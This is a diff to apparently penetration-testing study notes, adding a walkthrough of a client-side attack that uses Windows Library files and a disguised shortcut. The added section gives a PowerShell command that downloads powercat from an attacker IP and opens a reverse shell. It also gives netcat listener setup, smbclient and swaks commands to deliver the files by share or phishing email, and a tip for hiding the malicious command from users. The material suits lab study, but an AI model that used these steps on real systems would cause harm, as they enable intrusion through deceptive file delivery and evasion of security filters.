@@ -85,7 +85,7 @@ Let's use an embedded macro in Word for a reverse shell!
 
 *NOTE: Older client-side attack vectors, like Dynamic Data Exchange (DDE) and various Object Linking and Embedding (OLE) methods will work poorly without modifying our target system significantly.*
 
-Create a black Word doc names mymacro and save it as a .doc (97-2003). The .docx type cannot save macros without attached a containing template, which means we can run them but cannot save or embed them. We can, however, also try .docm.
+Create a blank Word doc names mymacro and save it as a .doc (97-2003). The .docx type cannot save macros without attached a containing template, which means we can run them but cannot save or embed them. We can, however, also try .docm.
 
 Once saved, go to the View tab and click the Macros element. Name the macro MyMacro and select the MyMacro document in the Macros in drop down menu. Click Create. You'll see the MS Visual Basic for Application window. We are provided the following template:
 
@@ -234,3 +234,105 @@ $ nc -nlvp 4444
 ```
 
 Success!
+
+## Obtaining Code Execution via Windows Library Files
+
+Windows Library files (.Library-ms) are virtual containers for user content that connect users with remotely-stored data like that of web services or shares.
+
+Let's try a two-datge client-side attack, where we use Windows library files to gain the foothold on the target and then provide an executable file to start a reverse shell when double-clicked.
+
+Create a Windows library file connecting to a WebDAV share. 
+
+```console
+$ pip3 install wsgidav
+$ mkdir /home/kali/webdav
+$ touch /home/kali/webdav/test.txt
+$ /home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
+```
+
+Open http://127.0.0.1 in your browser to ensure it is serving.
+
+Now, we'll create the Windows library file.
+
+Enter Visual Studio Code on a Windows box. (You could use Notepad)
+
+File > New Text File > Save as "config.Library-ms" on the Desktop and enter the following XML and change the IP to your attacker IP.
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@windows.storage.dll,-34582</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>imageres.dll,-1003</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>http://192.168.45.224</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+Double click the new file and view the test.txt file in Windows Explorer. Also, the path only shows "config" and does not indicate it is pulling from a remote location!
+
+If you re-open VSC, you will see a serialized tag added, which is base-64 encoded info about the location of the url tag. Content in url tags are also changed from the http://ip that we set to \\ip\DavWWWRoot in an attempt to optimize the connection info. We will need to reset the file to the above code everytime we execute the library file.
+
+A majority of spam filters and security tech allow Windows library files through. 
+
+Now, make the .lnk file that executes the reverse shell.
+
+On the target user desktop, right click, Create New, and create a Shortcut. In the location field, end the reverse shell command we've used previously:
+
+```
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.224:8000/powercat.ps1');powercat -c 192.168.45.224 -p 4444 -e powershell"
+```
+
+TIP: To hide the command when targeting a tech-savvy user, put a delimiter and benign command behind it to push the malicious command to the hidden area in the property menu.
+
+In the next page, name the file automatic_configuration and Finish.
+
+On Kali, start a web server **in the dir where powercat is** and a netcat listener.
+
+```
+$ python3 -m http.server 8000
+
+// new terminal
+
+$ nc -nlvp 4444
+```
+NOTE: We could host powercat on the WebDAV share as well, but since our WebDAV share is writable, AV and other tech may remove or quarantine our payload. If we made it read-only, we'd lose a great method of transferring files from target systems. 
+
+Double-click the shortcut file to start the reverse shell.
+
+### Send Malicious File Over SMB
+
+Copy automatic_configuration.lmk and config.Library-ms to our WebDAV dir on Kali. We can use the config library file to do this. (In a real assessment, we'd more likely send it over email).
+
+Start your webserver (in same dir as powercat) and nc listener again.
+
+```
+$ python3 -m http.server 8000
+
+// new terminal
+
+$ nc -nlvp 4444
+
+// new terminal, in webdav directory
+
+$ rm test.txt
+$ smbclient //192.168.243.195/share -c 'put config.Library-ms'
+```
+
+Once the user opens it, you have your reverse shell! If this doesn't work, Try Harder and combine it with an Office macro attack or something else.
+
+If you have to send the file over email, try to use swaks! You will need the username and password of the sending account.
+
+```console
+swaks -t jane.doe@targetorg.com --from pwnd@targetorg.com -attach config.Library-ms --server 111.111.111.111 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
+```
